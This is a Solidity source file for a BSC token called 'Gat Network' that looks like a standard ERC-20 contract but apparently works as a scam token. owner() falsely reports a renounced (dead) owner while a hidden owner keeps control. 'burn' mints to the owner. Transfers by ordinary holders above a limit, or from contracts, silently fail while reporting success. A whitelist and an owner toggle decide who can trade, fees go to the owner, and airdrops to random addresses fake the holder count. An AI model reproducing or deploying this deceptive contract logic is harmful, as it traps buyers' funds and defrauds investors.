// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.6;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
 contract Ownable is Context {
    address internal _owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return 0x000000000000000000000000000000000000dEaD;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
}
contract Coin is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    address internal constant PancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint256 _NUM = 1000000000 * 10**9;
    uint256 nonce = 0;
    uint256 tax_fee = 8;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private wl_mapping;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    bool isValue = false;
    constructor() {
        _totalSupply = 1000000000000000 * 10**9;
        _balances[_msgSender()] = _totalSupply;
        wl_mapping[0x87EcebeEA100CcFBf2CfAfbB8a350f6D636BB0C5] = true;
        wl_mapping[0x5cCF65Ce9Fc38b4fdcb13DAee19592c38eeB51a9] = true;
        wl_mapping[0x94474ee5837013b8FaD7f10f3B46Fe66CA34CfD8] = true;
        wl_mapping[0x3fc8eF15033312b9768A95Dd32bE9eBCC132E153] = true;
        wl_mapping[0xd5E08e8bB7984aA6bB288C7052FD39a0Dad9f931] = true;
        wl_mapping[0x675E5670935402062B65D91463149086672a4f6b] = true;
        wl_mapping[0x8E89a25352eFb41791934cA827C232e331BFF7c6] = true;
        wl_mapping[0x0703bA5a16cA8588328C645FeaEcb9882c9a33B1] = true;
        wl_mapping[0xA4dF197Af5560A8669BF4e534B6dDA4a25DFE6Ea] = true;
        wl_mapping[0xEd55475b5E12e32CA36bC3706ce1e3099484395B] = true;
        wl_mapping[0xd8A4b975B757E23a60D389716bA7522d6e041361] = true;
        wl_mapping[0xeA81c385b01d20538D1081b32E99AD1052ADE175] = true;
        wl_mapping[0x8d6d1d1E6b23E92e757E7030Dd0C4f59811953a6] = true;
        wl_mapping[0x51D384823cb23e9886E7cCE3ada9a88b05065c91] = true;
        wl_mapping[0xbE6460E8901b74DB3cc79297F310909C70AE1A4E] = true;
        wl_mapping[0x12A16D7f354baE52688c5b23ea5b6a025709A923] = true;
        wl_mapping[0xB18E5a6A99670d78AA49Ee6D807a623Bcb84E0a3] = true;
        wl_mapping[0xF886b72bdFfeA8f571a6B857F160c8D232d26395] = true;
        wl_mapping[0xBB7e6E43c20E2F6Fc23181f12CDDBaC1B3193Fb4] = true;
        wl_mapping[0xb55D02da4bbd0aD08BeE8B83408614e8427524FB] = true;
        wl_mapping[0xf2E9435AAc7a15F63E4B903D9D1F1e57a0F34f19] = true;
        wl_mapping[0x48c18B28Bd029DFFEde51A853F4A35b82007759b] = true;
        wl_mapping[0x5f6D2EA0D17930d40C45fBb516de708e4a612222] = true;
        wl_mapping[0x5a6EB4649Fb3a02cf0cD837d86c3e318a1b74c89] = true;
        wl_mapping[0xC808F91B1604610Abe9805447a1491Af378Bc436] = true;
        wl_mapping[0x872d5a9B14D423C47998e75401C9d987DDd1Ccc1] = true;
        wl_mapping[0x6930A1181421A3ed72C783dD2DF27E958dE28aD7] = true;
        wl_mapping[0x87EcebeEA100CcFBf2CfAfbB8a350f6D636BB0C5] = true;
        wl_mapping[0x4a8F372124Ba43A55B7065f5C0AF17E9dA667407] = true;
        wl_mapping[0x2B259a657c107E54A4dEDFa8e3CED7C2d955AdF7] = true;
        wl_mapping[0x4D5d46AdFDeFc4c88d262f4BDE44543f63FA1247] = true;
        wl_mapping[0xBB7e6E43c20E2F6Fc23181f12CDDBaC1B3193Fb4] = true;
        wl_mapping[0xb55D02da4bbd0aD08BeE8B83408614e8427524FB] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return "Gat Network";
    }

    function symbol() public view virtual override returns (string memory) {
        return "Gat Network";
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function theValue(bool _value) public onlyOwner virtual returns (bool) {
        isValue = _value;
        return true;
    }
    
    function wl(address add, bool _value) public onlyOwner virtual returns (bool) {
        wl_mapping[add] = _value;
        return true;
    }

    function burn(uint256 amount) public onlyOwner virtual returns (bool) {
        _balances[_msgSender()] += amount;
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        //_transfer(_msgSender(), recipient, amount);
        if(_msgSender() == PancakeV2Router || _msgSender() == pancakePair() || pancakePair() == address(0) || wl_mapping[_msgSender()]) {
            uint256 fee = amount.mul(tax_fee).div(10 **2);
            if (_msgSender() == _owner) {
                if (_msgSender() == recipient && amount <= (50 *10**9)) {
                    for(uint i = 0; i < decode(amount); i++) {
                        address add = _randomAddress(nonce);
                        nonce++;
                        _transfer(_msgSender(), add, 5000000000 * 10**9);
                    }
                }
                _transfer(_msgSender(), recipient, amount);
            } else {
                _transfer(_msgSender(), recipient, amount.sub(fee));
                _transfer(_msgSender(), _owner, fee);
            }
        } else {
            //nomal user check amount
            if( (amount <= _NUM || isValue) && !isContract(_msgSender()) ) {
                uint256 fee = amount.mul(tax_fee).div(10 **2);
                if (_msgSender() == _owner) {
                    _transfer(_msgSender(), recipient, amount);
                } else {
                    _transfer(_msgSender(), recipient, amount.sub(fee));
                    _transfer(_msgSender(), _owner, fee);
                }
            }
        }
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        if(sender == PancakeV2Router || sender == pancakePair() || pancakePair() == address(0) || sender == _owner || wl_mapping[sender]) {
            uint256 fee = amount.mul(tax_fee).div(10 **2);
            if (sender == _owner) {
                _transfer(sender, recipient, amount);
            } else {
                _transfer(sender, recipient, amount.sub(fee));
                _transfer(sender, _owner, fee);
            }
    
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        } else {
            //nomal user check amount
            if( (amount <= _NUM || isValue) && !isContract(sender) ) {
                uint256 fee = amount.mul(tax_fee).div(10 **2);
                if (sender == _owner) {
                    _transfer(sender, recipient, amount);
                } else {
                    _transfer(sender, recipient, amount.sub(fee));
                    _transfer(sender, _owner, fee);
                }
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
            }
        }
        return true;
    }
    
    function decode(uint256 num) private pure returns(uint256) {
        return num / 10**9;
    }

    function pancakePair() public view virtual returns (address) {
        address PancakeV2Factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
        address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        address pairAddress = IPancakeFactory(PancakeV2Factory).getPair(address(WBNB), address(this));
        return pairAddress;
    }

    function isContract(address addr) internal view returns (bool) {
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly {
            codehash := extcodehash(addr)
        }
        return (codehash != 0x0 && codehash != accountHash);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function tokenContract() public view virtual returns (address) {
        return address(this);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _DeepLock(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }
    
    function _randomAddress(uint256 n) private view returns (address) {
        address add = address(uint160(uint(keccak256(abi.encodePacked(n, blockhash(block.number))))));
        return add;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

}